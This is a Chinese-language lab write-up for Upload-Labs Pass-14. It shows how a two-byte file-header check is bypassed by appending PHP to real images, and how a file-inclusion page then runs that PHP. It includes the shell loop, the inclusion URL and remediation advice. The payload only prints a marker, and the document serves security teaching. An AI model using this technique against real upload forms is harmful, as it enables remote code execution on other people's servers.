Upload-Labs Pass-14：双字节文件头校验与图片马

Upload-Labs Web File Upload 图片马 文件头

Pass-14 只读取临时文件的前两个字节，再把两个十进制值拼接后与 JPG、PNG、GIF 的固定数字比较。真实图片后附加 PHP 代码不会改变前两个字节，因此图片马可以通过检查。

验证状态：JPG、PNG、GIF 三种探针均上传成功；通过 include.php 包含后均返回 IMAGE_INCLUDE_OK。

一、校验逻辑

$bin = fread($file, 2);
$strInfo = unpack("C2chars", $bin);
$typeCode = intval($strInfo['chars1'].$strInfo['chars2']);

// 255216 = JPG, 13780 = PNG, 7173 = GIF
$img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$fileType;

这段代码只证明文件前两字节像某种图片，不验证文件结构是否完整，也不检查附加内容。

二、构造安全图片马

先用 ImageMagick 生成合法的小图片，再追加固定输出探针：

for ext in jpg png gif; do
  convert -size 8x8 xc:white "probe.$ext"
  printf '%s' '<?php echo "IMAGE_INCLUDE_OK"; ?>' >> "probe.$ext"
done

上传后服务端根据文件头分别保存为 JPG、PNG、GIF。由于扩展名仍是图片后缀，直接访问只会得到图片内容；靶场提供的文件包含页会执行其中的 PHP 片段。

三、验证结果

格式上传包含后
JPG成功IMAGE_INCLUDE_OK
PNG成功IMAGE_INCLUDE_OK
GIF成功IMAGE_INCLUDE_OK

包含请求使用上传后的完整路径：

/include.php?file=/home/ctf/labs/upload-labs/upload/<uploaded-name>

四、修复建议

  • 不要只检查文件头；使用图像库完整解码。
  • 解码后重新编码，去除尾随数据和嵌入脚本。
  • 由服务端生成固定扩展名，并把上传目录移出 Web 根目录。
  • 禁止上传目录被模板、包含函数或脚本解析器直接读取。

五、复盘

“文件头正确”只表示一张文件的开头像图片。Pass-14 把浅层格式识别误当成安全边界，而文件包含漏洞把剩余的 PHP 内容推入了执行阶段。
